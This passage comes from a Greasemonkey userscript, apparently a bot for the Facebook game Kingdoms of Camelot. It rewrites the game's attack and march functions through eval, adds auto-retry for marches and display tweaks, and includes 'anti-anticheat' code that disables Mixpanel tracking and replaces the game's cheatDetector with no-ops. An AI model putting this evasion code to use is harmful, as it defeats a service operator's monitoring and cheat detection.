					t.pageLoaded=true;
				}
				if(e.target.id && e.target.id=='tooltip') {
					withinDomInserted=true;
					setTimeout(function() {
//						try {
//							if(t.options.disableDrawMapIcons)
////								t.DrawLevelIcons();
//							t.OnToolTipAppear(e.target);
//						} finally {
//							withinDomInserted=false;
//						}
					},0);
				} else if(e.target.className && e.target.className.indexOf('modal_msg_reports')>=0) {
					withinDomInserted=true;
					setTimeout(function() {
						try {
							t.RecordReports();
							t.AddCheckBarbarians();
							t.HighlightAllianceReports();
						} finally {
							withinDomInserted=false;
						}
					},0);
				}
			},false);
		}
		domTick();
},
};
//============================================================================================================
unsafeWindow.aaGotoMapHide = function (x, y){
  try {
    unsafeWindow.Modal.hideModal();
  } catch (e){ }
  try {
    Modal.hideModal();
  } catch (e){ }
  unsafeWindow.aaGotoMap (x, y);
}
//============================================================================================================
unsafeWindow.aaGotoMap = function (x, y){
	var close = document.getElementById('KOCAttackViewAttacksCancel');
	t.Click(close);
  setTimeout (function (){
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    var a = document.getElementById("mod_views").getElementsByTagName("a");
    for (var b = -1,j=a.length; ++b < j;) {
        a[b].className = ""
    }
    document.getElementById('mod_views_map').className = "sel";
    document.getElementById("maparea_city").style.display = 'none';
    document.getElementById("maparea_fields").style.display = 'none';
    document.getElementById("maparea_map").style.display = 'block';
    unsafeWindow.tutorialClear()
  }, 0);
};
//============================================================================================================
function SetupQuickMarchButton(useRetryMarch) {
	var retryMarches='var retryMarch = function() { '+
		'new (Ajax.Request)(g_ajaxpath + "ajax/march.php" + g_ajaxsuffix, {'+
		'method: "post",'+
        'parameters: params,'+
        'onSuccess: function(transport) {  marchSuccess(transport); },'+
        'onFailure: function () {  Modal.hideModalAll(); }'+
	'}); };';
	if(!useRetryMarch) {
		retryMarches='var retryMarch = function() { return; };';
	}
	var modal_attack_update_num_maxReplaces=[
		[['modal_attack_update_num_max','modal_attack_update_num_maxOld']],
		[['$("modal_attack_unit_ipt','var x=0; var o = getBuildingLevel(12); if(o==11){x=150000}else{x=o*10000};$("modal_attack_unit_ipt']],
		[['parseInt(','x; //parseInt(']]
	];
	var modalAttackReplaces=[
		[['modal_attack_do','modal_attack_doOld']],
		[['onSuccess:','onSuccess: marchSuccess=']],
		[['Modal.showAlert(printLocalError(','if(rslt.error_code==3 || rslt.error_code==8) { try {window.setTimeout(function() { retryMarch(); },(3*1000)); } catch(e) { alert("retry failed:"+e); }  } else { Modal.hideModalAll(); }  Modal.showAlert(printLocalError(']]
	];
	var attack_generatequeueReplaces=[
		[['attack_generatequeue','attack_generatequeueOld']],
		[
			['class=\\"army\\">" + g_js_strings.commonstr.army + ": "','style=\\"width: 145px !important\\" class=\\"army\\">"'],
			['class=\\"army\\">" + g_js_strings.commonstr.army + ": <span>"','style=\\"width: 145px !important\\" class=\\"army\\"><span style=\'display: inline\'>"']
		],
		[['class=\\"name','style=\\"width: 0px !important; display: none;\\" class=\\"name']],
	];
	var attack_generatequeueReplacesU=[
		[['var u = 0;','var u = "K:"+seed.knights["city" + currentcityid]["knt" + q].combat+", "; ']],
		[['u += parseInt','var x = parseInt']],
		[['"Count"]);','"Count"]); if(x>0) { var uname=unitcost["unt"+r][0]; u+=uname[0]+uname[uname.length-1]+":"+x+", "; } ']],
	];
	var attack_generatequeueReplacesR=[
		[['var r = 0;','var r = "K:"+seed.knights["city" + currentcityid]["knt" + t].combat+", "; ']],
		[['r += parseInt','var x = parseInt']],
		[['"Count"]);','"Count"]); if(x>0) { var uname=unitcost["unt"+p][0]; r+=uname[0]+uname[uname.length-1]+":"+x+", "; } ']],
	];
	var attack_generatequeueReplacesS=[
		[['var s = 0;','var s = "K:"+seed.knights["city" + currentcityid]["knt" + u].combat+", "; ']],
		[['s += parseInt','var x = parseInt']],
		[['"Count"]);','"Count"]); if(x>0) { var uname=unitcost["unt"+q][0]; s+=uname[0]+uname[uname.length-1]+":"+x+", "; } ']],
	];
	var attack_generatequeueReplacesT=[
		[['var t = 0;','var t = "K:"+seed.knights["city" + currentcityid]["knt" + w].combat+", "; ']],
		[['t += parseInt','var x = parseInt']],
		[['"Count"]);','"Count"]); if(x>0) { var uname=unitcost["unt"+q][0]; t+=uname[0]+uname[uname.length-1]+":"+x+", "; } ']],
	];
	var attack_generatequeueReplacesV=[
		[['var v = 0;','var v = "K:"+seed.knights["city" + currentcityid]["knt" + y].combat+", "; ']],
		[['v += parseInt','var f = parseInt']],
		[['"Count"]);','"Count"]); if(f>0) { var uname=unitcost["unt"+r][0]; v+=uname[0]+uname[uname.length-1]+":"+f+", "; } ']],
	];
	var attack_generatequeueReplacesW=[
		[['var w = 0;','var w = "K:"+seed.knights["city" + currentcityid]["knt" + A].combat+", "; ']],
		[['w += parseInt','var t = parseInt']],
		[['w += parseInt','var t = parseInt']],
		[['"Return"])','"Return"]); if(t>0) { var uname=unitcost["unt"+s][0]; w+=uname[0]+uname[uname.length-1]+":"+t+", "; } ']],
		[['"Count"])','"Count"]); if(t>0) { var uname=unitcost["unt"+s][0]; w+=uname[0]+uname[uname.length-1]+":"+t+", "; } ']],
	];
	var attack_generatequeueReplacesW2=[
		[['var w = 0;','var w = "K:"+seed.knights["city" + currentcityid]["knt" + E].combat+", "; ']],
		[['w += y','if(y>0) { var uname=unitcost["unt"+cm.UNIT_TYPES[t]][0]; w+=uname[0]+uname[uname.length-1]+":"+y+", "; }']],
	];
	if(!useRetryMarch) modalAttackReplaces.push(['Modal.hideModalAll();','']);
	var replaceFunc=function(name,replaces) {
		var modalAttackFunc=window[name].toString();
		var nameOld=name+'Old';
		var foundFailed=false;
		for(var a=-1,j=replaces.length; ++a<j;) {
			var found=false;
			var repArr=replaces[a];
			for(var ra=-1,k=repArr.length; ++ra<k;) {
				var repI=repArr[ra];
				if(typeof(repI[0])=="object") {
					found=repI[0].exec(modalAttackFunc)?true:false;
				} else {
					found=modalAttackFunc.indexOf(repI[0])>=0?true:false;
				}
				if(found) break;
			}
			if(!found) {
				var err="modalAttackReplace: cannot find: "+repI[0]+','+modalAttackFunc;
				var sp=document.createElement('span');
				sp.style.color='#ccc';
				sp.appendChild(document.createTextNode(err));
				document.body.insertBefore(sp,document.body.childNodes[0]);
				foundFailed=true;
				break;
			}
			modalAttackFunc=modalAttackFunc.replace(repI[0],repI[1]);
		}
		if(foundFailed) return;
		try {
			window[nameOld]=eval(modalAttackFunc);
		} catch(e) {
			alert(e+', bad func:'+modalAttackFunc);
		}
		window[name]=function(e) {
			window.setTimeout(function() {
				eval(nameOld+'(e);');
			},100);
		}
	};
	var attackFuncStr=window['modal_attack_do'].toString();
		modalAttackReplaces.push([
			['new (Ajax',"var marchSuccess=null; "+retryMarches+
			(useRetryMarch?"":" Modal.hideModalAll(); ")+
			"\nnew (Ajax"],
			['new Ajax',"var marchSuccess=null; "+retryMarches+
			(useRetryMarch?"":" Modal.hideModalAll(); ")+
			"\nnew Ajax"],
			['ajax.Request',"var marchSuccess=null; "+retryMarches+
			(useRetryMarch?"":" Modal.hideModalAll(); ")+
			"\najax.Request"]
		]);
	replaceFunc('modal_attack_do',modalAttackReplaces);
	function AddArray(to,from) {
		for(var c=-1,j=from.length; ++c<j;) { to.push(from[c]); }
	}
	var arr=[];
	AddArray(arr,attack_generatequeueReplaces);
	var funcStr=window['attack_generatequeue'].toString();
	if(funcStr.indexOf(' var w = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesW2);
	} else if(funcStr.indexOf('; var r = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesR);
	} else if(funcStr.indexOf('; var s = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesS);
	} else if(funcStr.indexOf('; var t = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesT);
	} else if(funcStr.indexOf('; var v = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesV);
	} else if(funcStr.indexOf('; var u = 0;')>=0) {
		AddArray(arr,attack_generatequeueReplacesU);
	} else {
		var err="Unknown attack queue func: "+location.href+"\n"+funcStr;
		GM_log(err);
	}
	replaceFunc('attack_generatequeue',arr);
}
//============================================================================================================
function CreateMsgDiv() {
	var m=document.getElementById('KOCAttackMsgDiv');
	if(!m) {
		var ml=document.getElementById('modal_msg_list');
		if(!ml) {
			ml=document.createElement('div');
			ml.id='modal_msg_list';
		}
		m=document.createElement('div');
		m.setAttribute('style', 'position:absolute; top:0px;left:0px; width:700px; z-index:900000; border:5px solid #000; background-color:#fff;');

		var close=document.createElement('a');
		close.addEventListener('click',function() {
			m.style.display='none';
			m.removeChild(ml);
		},false);
		close.innerHTML='Close';
		close.style.fontSize='20px';
		var center=document.createElement('center');
		center.appendChild(close);
		m.appendChild(center);
		m.appendChild(ml);
		if(!document.getElementById('modal_msg_list_pagination')) {
			p=document.createElement('div'); p.id='modal_msg_list_pagination';
			ml.appendChild(p);
		}
		if(document.body){
			document.body.appendChild(m);
		}
	}
	m.style.display='block';
	return m;
}
//============================================================================================================
function AddScript(js) {
	var scr=document.createElement('script');
	scr.innerHTML=js;
	document.body.appendChild(scr);
}
//============================================================================================================
function SetupScripts() {
	var options=KOCAttack.GetOptions();
	var scr=document.createElement('script');
	scr.innerHTML="CreateMsgDiv="+CreateMsgDiv+
		";\n"+
		";\n"+SetupQuickMarchButton+"\n; SetupQuickMarchButton("+options.retryMarch+"); \n";
	document.body.appendChild(scr);
}
//============================================================================================================
/******************* Anti-anticheat measures ******************/
var mixpanelRemoved=false;
function DisableMixpanel() {
	if(unsafeWindow.cm) {
		unsafeWindow.cm.MixPanelTracker.track=function() { };
	}
	if(unsafeWindow.MixpanelLib) {
		unsafeWindow.MixpanelLib.prototype={
			register:function() { },
			track:function(t) {
			}
		};
	}
	if(!unsafeWindow.cm || !unsafeWindow.MixpanelLib) {
		window.setTimeout(function() {
			DisableMixpanel();
		},100);
	} else {
		GM_log('Mixpanel removed');
		mixpanelRemoved=true;
	}
}
//============================================================================================================
//100 seconds to reload if element iframe_canvas is not found to reload
/******************* Check strange majic error ******************/
var checkWhtScr = {
checknumber:0,
checkWhiteScreen:function(){
  window.setTimeout(this.CheckiFrame,10000);
},
//------------------------------------------------------------------------------------------------------------
CheckiFrame:function(){
		var t = checkWhtScr;
		var iFrame = document.getElementById('iframe_canvas');
		if(iFrame)
		{return;}
		if (!iFrame && t.checknumber<10){
		  t.checknumber++;

		} else if (t.checknumber>=10){
			KOCAttack.ReloadWindow();
			return;
		}
		t.checkWhiteScreen();
}
};
//============================================================================================================
//15 seconds to reload if element kochead is not found to reload
var checkStrngMag = {
checknumber:0,
checkStrangeMagic:function(){
	window.setTimeout (this.CheckKocHead, 5000);
},
//------------------------------------------------------------------------------------------------------------
CheckKocHead:function(){
	var t = checkStrngMag;
	var kocHead = document.getElementById('kochead');
		if (kocHead)
			{return;}
		if (!kocHead && t.checknumber<3){
		  t.checknumber++;

		} else if (t.checknumber>=3){
			KOCAttack.ReloadWindow();
			return;
		}
		t.checkStrangeMagic();
}
};
//============================================================================================================
function popup (left, top, width, height, content){
   var div = document.createElement('div');
   if (width)
       div.style.width = width;
   if (height)
       div.style.height = height;
   if (left || top) {
       div.style.position = "relative";
       if (left)
           div.style.left = left;
       if (top)
           div.style.top = top;
   }
   if (content)
       div.innerHTML = content;
   div.setAttribute('style', 'background:#ffc; border:2px solid #000; z-index:999999; display:block;');
  window.document.body.insertBefore(div, window.document.body.childNodes[0]);
  return div;
}
//============================================================================================================
/******************* Function calls ******************/
KOCAttack.Listen();
if(unsafeWindow.cm){
	unsafeWindow.cm.cheatDetector={
		a:function(){  },
		detect:function() { }
	};
}
if(document.URL.search('apps.facebook.com/kingdomsofcamelot/')>=0) {
	checkWhtScr.checkWhiteScreen();
} else {
	StartAll();
}
var startAllTimeout=null;
//============================================================================================================
function StartAll() {
	DisableMixpanel();
	var now=new Date().getTime();
	if(startAllTimeout==null) {
		startAllTimeout=now+5000;
	}
	if(mixpanelRemoved || startAllTimeout<now) {
		if(startAllTimeout<now) {
			GM_log("Did not remove mixpanel, starting anyways");
		}
		KOCAttack.SetupClearMessages();
		SetupScripts();
	} else {
		window.setTimeout(function() { StartAll(); },200);
	}
}
//============================================================================================================
var WINLOG_MAX_ENTRIES = 1000;
var WinLog = {
state : null,
win: null,
eOut : null,
lastE : null,
enabled : true,
reverse : true,
busy : false,
isOpening : false,
//------------------------------------------------------------------------------------------------------------
open:function (){
    var t = WinLog;
	GM_log("opening WinLog");
    function eventButClear(){
      t.lastE = null;
      t.eOut.innerHTML ='';
    }
    function eventButReverse(){
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (var i=n-1; --i>=0;){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    if (!t.win || t.win.closed){
    t.isOpening = true;
    t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
    t.isOpening = false;
		t.state = null;
		}
    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style>\
        <BODY style="margin:0px; padding:0px; border:none">\
        <DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid">\
        <INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div>\
        <DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.state = 1;
    }
},
 //------------------------------------------------------------------------------------------------------------
write:function (msg){
      var t = WinLog;
      if (!t.enabled || t.isOpening){
        return;
	  	}
      t.open();
	  	return;
      var te = document.createElement('pre');
      var now = new Date();
      var m = [];
      var millis = now.getMilliseconds();
      m.push (now.toTimeString().substring (0,8));
      m.push ('.');
      if (millis<100)
      m.push('0');
      if (millis<10)
      m.push('0');
      m.push(millis);
      m.push (': ');
      m.push (msg);
      te.innerHTML = m.join('');
      if (t.reverse){
        if (t.lastE == null){
          t.eOut.appendChild(te);
          t.lastE = te;
        } else {
          t.eOut.insertBefore(te, t.lastE);
        }
        var hr = document.createElement('hr');
        t.eOut.insertBefore(hr, te);
        t.lastE = hr;
      } else {
        t.eOut.appendChild(te);
        t.eOut.appendChild(document.createElement('hr'));
      }
},
};
//============================================================================================================